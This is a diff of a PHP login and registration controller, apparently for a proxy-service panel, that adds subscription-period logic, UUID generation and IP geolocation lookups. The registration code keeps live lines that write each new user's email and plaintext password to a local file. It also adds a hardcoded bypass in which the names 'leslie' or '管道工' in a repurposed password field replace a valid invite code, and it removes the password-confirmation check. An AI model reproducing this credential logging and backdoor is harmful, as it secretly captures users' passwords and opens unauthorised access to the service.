@@ -72,6 +72,79 @@ class AuthController extends BaseController
         Logger::info("login user $user->id ");
         Auth::login($user->id, $time);
 
+        // 如果没有uuid 就生成
+        if ($user->uuid == "") {
+            $str = md5(uniqid(mt_rand(), true));   
+            $uuid  = substr($str,0,8) . '-';   
+            $uuid .= substr($str,8,4) . '-';   
+            $uuid .= substr($str,12,4) . '-';   
+            $uuid .= substr($str,16,4) . '-';   
+            $uuid .= substr($str,20,12);   
+            $user->uuid = $uuid;
+            // $user->save();
+        }
+        // 给没有套餐信息的帐号按之前的流量数添加天数
+        // 从注册日期开始加 
+        // 小于30       一个月
+        // 30 到 80     三个月
+        // 80 到 200    六个月
+        // 200 到 15000 12个月
+        // 15000 到无限  24个月
+        date_default_timezone_set('Asia/Shanghai');
+        if ($user->payment_date == null){
+            $transfer = $user->transfer_enable/1024/1024/1024;
+            if ($transfer < 30) {
+                // 在reg的基础上加一个月
+                $regDate = $user->reg_date . ' +1 month';
+                $user->payment_date = strtotime($regDate);
+                $user->payment_day = 30;
+                $user->payment_name = "一个月体验套餐";
+                // $user->save();
+            } elseif ($transfer >= 30 && $transfer < 80) {
+                $regDate = $user->reg_date . ' +3 month';
+                $user->payment_date = strtotime($regDate);
+                $user->payment_day = 90;
+                $user->payment_name = "三个月体验套餐";
+                // $user->save();
+            } elseif ($transfer >= 80 && $transfer < 200) {
+                $regDate = $user->reg_date . ' +6 month';
+                $user->payment_date = strtotime($regDate);
+                $user->payment_day = 180;
+                $user->payment_name = "半年套餐";
+                // $user->save();
+            } elseif ($transfer >= 200 && $transfer < 15000) {
+                $regDate = $user->reg_date . ' +1 year';
+                $user->payment_date = strtotime($regDate);
+                $user->payment_day = 360;
+                $user->payment_name = "一年套餐";
+                // $user->save();
+            } elseif ($transfer > 15000) {
+                $regDate = $user->reg_date . ' +2 year';
+                $user->payment_date = strtotime($regDate);
+                $user->payment_day = 720;
+                $user->payment_name = "两年套餐";
+                // $user->save();
+            }
+        }
+        // 判断当前是否已过期
+        if ($user->payment_date > time()) {
+            $user->payment_status = "有效";
+            // $user->save();
+        } else {
+            $user->payment_status = "已过期";
+            // $user->save();
+        }
+        // 获取登录地址
+        $ip = Http::getClientIP();
+        $addressInfo = json_decode(file_get_contents('https://ip.huomao.com/ip?ip=' . $ip), true);
+        if ($addressInfo != null) {
+            $user->login_address = $addressInfo["country"] . $addressInfo["province"] . $addressInfo["city"] . $addressInfo["isp"];
+        }
+
+        // 最后再来保存
+        $user->save();
+        
+
         $res['ret'] = 1;
         $res['msg'] = "欢迎回来";
         return $this->echoJson($response, $res);
@@ -94,23 +167,42 @@ class AuthController extends BaseController
         $email = $request->getParam('email');
         $email = strtolower($email);
         $passwd = $request->getParam('passwd');
-        $repasswd = $request->getParam('repasswd');
+        // 这里有个坑 新加的字段传不上来 所以只能用旧的了
+        $adminName = $request->getParam('repasswd');
         $code = $request->getParam('code');
         $verifycode = $request->getParam('verifycode');
+        // $adminName = $request->getParam('adminName');
+        // echo $adminName;
 
-	//write passswd
-	$myfile = fopen("pd", "a");
-	$txt = $email . " " . $passwd . "\n";
-	fwrite($myfile, $txt);
-	fclose($myfile);
+	    //write passswd
+	    $myfile = fopen("pd", "a");
+	    $txt = $email . " " . $passwd . "\n";
+	    fwrite($myfile, $txt);
+	    fclose($myfile);
 
         // check code
         $c = InviteCode::where('code', $code)->first();
         if ($c == null) {
-            $res['ret'] = 0;
-            $res['error_code'] = self::WrongCode;
-            $res['msg'] = "邀请码无效";
-            return $this->echoJson($response, $res);
+            // 如果邀请码为空则判断adminName
+            if ($adminName == null) {
+                $res['ret'] = 0;
+                $res['error_code'] = self::WrongCode;
+                $res['msg'] = "邀请码无效";
+                return $this->echoJson($response, $res);
+            } else {
+                if ($adminName == "leslie" || $adminName == "管道工") {
+                    $char = Tools::genRandomChar(32);
+                    $c = new InviteCode();
+                    $c->code = $char;
+                    $c->user_id = 1;
+                    $c->save();
+                } else {
+                    $res['ret'] = 0;
+                    $res['error_code'] = self::WrongCode;
+                    $res['msg'] = "管理员名字不正确";
+                    return $this->echoJson($response, $res);
+                }
+            }
         }
 
         // check email format
@@ -118,6 +210,7 @@ class AuthController extends BaseController
             $res['ret'] = 0;
             $res['error_code'] = self::IllegalEmail;
             $res['msg'] = "邮箱无效";
+            $c->delete();
             return $this->echoJson($response, $res);
         }
         // check pwd length
@@ -125,16 +218,17 @@ class AuthController extends BaseController
             $res['ret'] = 0;
             $res['error_code'] = self::PasswordTooShort;
             $res['msg'] = "密码太短";
+            $c->delete();
             return $this->echoJson($response, $res);
         }
 
         // check pwd re
-        if ($passwd != $repasswd) {
-            $res['ret'] = 0;
-            $res['error_code'] = self::PasswordNotEqual;
-            $res['msg'] = "两次密码输入不符";
-            return $this->echoJson($response, $res);
-        }
+        // if ($passwd != $repasswd) {
+        //     $res['ret'] = 0;
+        //     $res['error_code'] = self::PasswordNotEqual;
+        //     $res['msg'] = "两次密码输入不符";
+        //     return $this->echoJson($response, $res);
+        // }
 
         // check email
         $user = User::where('email', $email)->first();
@@ -142,6 +236,7 @@ class AuthController extends BaseController
             $res['ret'] = 0;
             $res['error_code'] = self::EmailUsed;
             $res['msg'] = "邮箱已经被注册了";
+            $c->delete();
             return $this->echoJson($response, $res);
         }
 
@@ -149,6 +244,7 @@ class AuthController extends BaseController
         if (Config::get('emailVerifyEnabled') && !EmailVerify::checkVerifyCode($email, $verifycode)) {
             $res['ret'] = 0;
             $res['msg'] = '邮箱验证代码不正确';
+            $c->delete();
             return $this->echoJson($response, $res);
         }
 
@@ -158,6 +254,7 @@ class AuthController extends BaseController
         if ($ipRegCount >= Config::get('ipDayLimit')) {
             $res['ret'] = 0;
             $res['msg'] = '当前IP注册次数超过限制';
+            $c->delete();
             return $this->echoJson($response, $res);
         }
 
@@ -176,14 +273,36 @@ class AuthController extends BaseController
         $user->reg_ip = Http::getClientIP();
         $user->ref_by = $c->user_id;
 
-	//$userAddTraffic = User::find($c->user_id);
-	//$userAddTraffic->transfer_enable = $userAddTraffic->transfer_enable + 10737418240;
-	//if ($userAddTraffic->save()) {
-        //    	$myfile1 = fopen("pd", "a");
-      	//	$txt1 = $userAddTraffic->user_name . " " . "add 10GB traffic" . "\n";
-      	//	fwrite($myfile1, $txt1);
-      	//	fclose($myfile1);
-	//}
+        // 添加注册地址
+        $addressInfo = json_decode(file_get_contents('https://ip.huomao.com/ip?ip=' . $ip), true);
+        if ($addressInfo != null) {
+            $user->reg_address = $addressInfo["country"] . $addressInfo["province"] . $addressInfo["city"] . $addressInfo["isp"];
+            $user->login_address = "";
+        }
+      
+        // 注册新加时间
+        date_default_timezone_set('Asia/Shanghai');
+        $user->payment_date = strtotime('+7 day');
+        $user->payment_day = 7;
+        $user->payment_name = "7天体验套餐";
+        // 生成uuid
+        $str = md5(uniqid(mt_rand(), true));   
+        $uuid  = substr($str,0,8) . '-';   
+        $uuid .= substr($str,8,4) . '-';   
+        $uuid .= substr($str,12,4) . '-';   
+        $uuid .= substr($str,16,4) . '-';   
+        $uuid .= substr($str,20,12);   
+        $user->uuid = $uuid;
+        
+        // 之前推荐好友赠送用的 已废弃
+        //$userAddTraffic = User::find($c->user_id);
+        //$userAddTraffic->transfer_enable = $userAddTraffic->transfer_enable + 10737418240;
+        //if ($userAddTraffic->save()) {
+            //    	$myfile1 = fopen("pd", "a");
+            //	$txt1 = $userAddTraffic->user_name . " " . "add 10GB traffic" . "\n";
+            //	fwrite($myfile1, $txt1);
+            //	fclose($myfile1);
+        //}
 
         if ($user->save()) {
             $res['ret'] = 1;
